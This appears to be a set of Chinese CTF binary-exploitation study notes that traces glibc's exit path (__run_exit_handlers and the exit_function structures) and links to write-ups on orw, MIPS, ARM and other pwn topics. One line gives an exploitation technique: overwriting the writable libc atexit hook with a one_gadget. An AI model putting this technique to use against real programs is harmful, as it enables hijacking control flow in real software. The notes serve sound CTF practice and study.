> https://meteorpursuer.github.io/2021/01/21/%E6%B5%85%E8%B0%88exit%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E4%B9%8B%E4%B8%80exit%20hook/ 这个讲的比较详细，中文的
>
> https://www.freesion.com/article/9980545061/

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/glibc_program_lifecycle.png)

[`/csu/libc-start.c`](https://elixir.bootlin.com/glibc/glibc-2.31/source/csu/libc-start.c#L129) `__libc_start_main` -> [`main`](https://elixir.bootlin.com/glibc/glibc-2.31/source/csu/libc-start.c#L339) -> [`exit`](https://elixir.bootlin.com/glibc/glibc-2.31/source/csu/libc-start.c#L342) -> [`__run_exit_handlers`](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdlib/exit.c#L38) -> [`RUN_HOOK (__libc_atexit, ());`](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdlib/exit.c#L130) -> `__elf_set___libc_atexit_element__IO_cleanup__`的`_IO_cleanup`

`__libc_start_main`最后几行会调用main，随即调用`exit`，实现逻辑在`__run_exit_handlers`。`__libc_start_main`中会调用[`__cxa_atexit`](https://elixir.bootlin.com/glibc/glibc-2.31/source/csu/libc-start.c#L248)->`__internal_atexit (func, arg, d, &__exit_funcs);` [`__internal_atexit`](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdlib/cxa_atexit.c#L34) 中会将函数注册到`__exit_funcs`链表中

```c
void exit (int status) { // __libc_start_main 最后一行会调用 exit (result);
  __run_exit_handlers (status, &__exit_funcs, true, true);
} 
```

```c
struct exit_function {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union {
        void (*at) (void);
        struct {
            void (*fn) (int status, void *arg);
            void *arg;
        } on;
        struct {
            void (*fn) (void *arg, int status);
            void *arg;
            void *dso_handle;
        } cxa;
    } func;
};
struct exit_function_list {
  struct exit_function_list *next;
  size_t idx;
  struct exit_function fns[32]; // functions
};
```

`/stdlib/exit.c`的[`__run_exit_handlers`](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdlib/exit.c#L38) 是`__libc_start_main`最后调用[`exit (result);`](https://elixir.bootlin.com/glibc/glibc-2.31/source/csu/libc-start.c#L342)时的逻辑实现，主要逻辑：

- `__call_tls_dtors()`: call destructors in `tls_dtor_list`.





- `RUN_HOOK (__libc_atexit, ());` 会call `__elf_set___libc_atexit_element__IO_cleanup__` 的`_IO_cleanup`
  `__elf_set___libc_atexit_element__IO_cleanup__` 可写，可以将`one_gadget`写到此处





## orw

> https://blog.csdn.net/seaaseesa/article/details/106685468 RCTF2020_nowrite(libc_start_main的妙用+盲注)
>
> https://balsn.tw/ctf_writeup/20200627-0ctf_tctf2020quals/#simple-echoserver  0CTF/TCTF 2020 Quals 其中echo是格式化字符串漏洞+orw+栈溢出



## Race Condition

> 条件竞争

## Integer Overflow/Underflow

> \*CTF starCTF 2022 pwn examination: 整数下溢

## Sandbox Escape

> 沙箱逃逸

## Kernel





## MIPS

> https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/

```bash
sudo apt-get install qemu-user # 然后就可以像做x86的一样做了 实际上是
sudo apt-get install -y gcc-mips-linux-gnu # 安装mips的as gcc等程序
```

> onegadget 不支持mips, ropper支持mips



## ARM

> https://blog.csdn.net/qq_41202237/article/details/118188924
>
> https://www.cfanz.cn/resource/detail/DoRpODNWGlMVv





---

# Windows Pwn

